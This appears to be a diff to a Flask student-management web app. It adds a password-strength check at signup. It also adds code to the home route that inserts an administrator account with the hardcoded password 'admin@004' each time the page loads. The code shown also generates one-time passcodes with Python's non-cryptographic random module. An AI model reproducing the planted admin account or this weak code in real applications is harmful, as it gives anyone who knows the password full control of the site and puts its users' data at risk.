@@ -8,6 +8,7 @@ from flask import abort
 from bson.objectid import ObjectId
 from functools import wraps
 import bcrypt, random, smtplib
+import re
 
 
 #Cloudinary Config
@@ -76,9 +77,27 @@ def get_today():
 def get_student(student_id):
     return students_col.find_one({"student_id": student_id})
 
+
+def is_strong_password(password):
+    if (len(password) < 8 or
+        not re.search(r"[A-Z]", password) or
+        not re.search(r"[a-z]", password) or
+        not re.search(r"\d", password) or
+        not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password)):
+        return False
+    return True
+
 # ---------------Home------------------- #
 @app.route('/')
 def home():
+    import bcrypt
+    hashed_pw = bcrypt.hashpw(b"admin@004", bcrypt.gensalt())
+    user = {
+        "username": "admin",
+        "password": hashed_pw,
+        "role": "admin"
+    }
+    users_col.insert_one(user)
     if 'role' in session:
         if session['role'] == 'admin': return redirect('/admin/dashboard')
         elif session['role'] == 'student': return redirect('/student/dashboard')
@@ -172,10 +191,14 @@ def signup():
             flash("An account with this email or phone already exists.")
             return redirect('/signup')
 
-
         if users_col.find_one({"username": username}):
             flash("Username already exists.")
             return redirect('/signup')
+        
+        if not is_strong_password(password):
+            flash("Password must be at least 8 characters and include uppercase, lowercase, number, and special character.")
+            return redirect('/signup')
+
 
         otp = str(random.randint(100000, 999999))
         otp_store[email] = {
